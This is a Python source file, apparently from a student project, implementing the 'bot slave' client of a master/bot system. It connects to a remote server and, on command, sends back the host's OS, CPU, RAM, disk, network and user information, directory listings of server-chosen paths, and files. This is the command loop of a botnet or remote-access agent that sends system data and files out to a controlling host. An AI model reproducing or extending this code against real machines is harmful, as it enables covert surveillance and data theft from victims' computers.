"""
Codice sorgente per la gestione della connessione con il server (bot-client).

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
import asyncio
import re
from . import bot_slave_utilities as bot_utils
# from functools import partial  # Per comodità leggiamo il file da inviare in chunk di dati

__response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTITION-DISK-INFO", "5": "PARTITION-DISK-STATUS",
                      "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "USERS", "9": "DOWNLOAD-FILE", "10": "Content-Path", "q": "QUIT"}

__buffer_size = 8192


# Passiamo alla funzione anche il writer in modo da poter ciclare sui vari oggetti (in particolare dischi e schede di rete)
async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
    """Gestione dell'operazione impartita dal master da eseguire."""
    match case:
        case 'OS-TYPE':
            writer.write(bot_utils.get_operating_system())  # Per semplicità andiamo a parametrizzare gli oggetti separandoli con gli __headers_type

        case 'CPU-STATS':
            writer.write(bot_utils.get_cpu_information())

        case 'RAM':
            writer.write(bot_utils.get_ram_size())

        case 'PARTITION-DISK-INFO':
            await bot_utils.get_partition_disk_info(writer)

        case 'PARTITION-DISK-STATUS':
            writer.write(bot_utils.get_io_disk_statistics())

        case 'NETWORK-INFO':
            await bot_utils.get_network_info(writer)

        case 'USERS':
            await bot_utils.get_users(writer)

        case 'DOWNLOAD-FILE':
            # TODO: Spostare la funzione a parte e gestire la richiesta del file con un dictionary una volta listato il contenuto (?)
            request = "test.png"  # Atm il file è hardcoded -> In questo punto facciamo stripping della request ricevuta dal server e controlliamo se esiste sul disco il file richiesto
            await bot_utils.send_file(request, __buffer_size, writer)  # Spostiamo la gestione del controllo di esistenza del file all'interno della funzione stessa
        case _:
            return "NULL"


async def run_client(hostname: str, port: int) -> None:
    """Comunicazione con il server attraverso le socket. In base alle richieste impartite dal server il client esegue diverse operazioni."""
    reader, writer = await asyncio.open_connection(hostname, port)
    operation_keyword = "Operazione?"

    await asyncio.sleep(1)
    writer.write(operation_keyword.encode())
    await writer.drain()
    while True:
        response = await reader.read(__buffer_size)
        if not response:
            raise Exception("Socket closed!")
        print(f"Received from server: {response.decode()!r}")
        if response.decode() in __response_options.values():  # Controlliamo che il valore ottenuto matchi con qualche operazione presente nel dizionario
            """
            In base a quello ottenuto dal server il client effettuerà l'operazione corrispondente
            """
            # Nel caso in cui il server chieda di quittare inviamo la conferma di quit al server e interrompiamo il loop
            if response.decode() == "QUIT":
                writer.write(b"quit")
                await writer.drain()
                break
            else:
                await command_to_execute(writer, response.decode())
                await asyncio.sleep(1)
                writer.write(operation_keyword.encode())
        elif response.decode().startswith(__response_options["10"]):
            request = re.split(__response_options["10"], response.decode())[1]
            await bot_utils.send_dir_content(request, os_type, writer)
            writer.write(operation_keyword.encode())
        else:  # In caso contrario chiediamo al server di inviare una nuova risposta valida
            writer.write(operation_keyword.encode())


def set_initializer():
    """Setter e wrapper della funzione di recupero OS."""
    global os_type
    os_type = bot_utils.os_type_initializer()
